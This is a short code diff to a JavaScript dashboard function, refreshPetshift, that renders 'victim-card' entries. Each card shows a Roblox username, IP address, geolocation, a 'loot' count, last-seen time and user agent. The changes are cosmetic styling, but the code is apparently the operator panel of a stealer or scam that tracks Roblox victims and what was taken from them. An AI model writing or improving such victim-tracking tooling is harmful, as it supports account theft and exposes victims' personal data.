@@ -1934,10 +1934,10 @@ async function refreshPetshift() {
       const geo = p.geo ? `${p.geo.city || ''} ${p.geo.country || ''}`.trim() : '';
       const age = lastSeenAge(p.last_seen);
       const user = p.roblox_user || 'no login';
-      return `<div class="victim-card" onclick="openPetshiftDetail('${p.pid}')">
+      return `<div class="victim-card" onclick="openPetshiftDetail('${p.pid}')" style="cursor:pointer">
         <div class="vc-top"><span class="vc-name">${esc(user)}</span><span class="vc-tag">${esc(p.platform || 'web')}</span></div>
         <div class="vc-meta">${esc(p.ip || '?')} · ${esc(geo || '—')}</div>
-        <div class="vc-meta">loot ${p.loot_count || 0} · ${esc(age)} · ${esc((p.pid || '').slice(0,10))}</div>
+        <div class="vc-meta"><span class="pill">loot ${p.loot_count || 0}</span> · ${esc(age)} · <span class="muted">${esc((p.pid || '').slice(0,10))}</span></div>
         <div class="vc-meta muted">${esc((p.ua || '').slice(0,90))}</div>
       </div>`;
     }).join('');
